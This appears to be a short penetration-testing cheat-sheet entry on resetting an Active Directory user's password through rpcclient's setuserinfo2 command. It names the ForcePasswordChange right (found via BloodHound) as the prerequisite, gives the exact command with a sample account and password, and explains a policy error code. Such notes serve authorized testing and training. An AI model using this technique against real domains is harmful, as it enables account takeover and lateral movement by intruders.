# RPC Password Reset

##### Introduction 
[https://room362.com/post/2017/reset-ad-user-password-with-linux/](https://room362.com/post/2017/reset-ad-user-password-with-linux/)

###### Requirements
- You cannot reset the password of a user which has `AdminCount = 1`. This means Domain Admins mainly
- Your compromised user must have the `ForcePasswordChange`, which can be detected using Bloodhound.

##### Execution
```
rpcclient $> setuserinfo2
Usage: setuserinfo2 username level password [password_expired]
```

```
rpcclient $> setuserinfo2 adminuser 23 'ASDqwe123'
rpcclient $>
```

Note: If successful, it will just exit silently.

##### Error Codes
```
result was NT_STATUS_PASSWORD_RESTRICTION
```

This means that the password being set does not meet password policy requirements.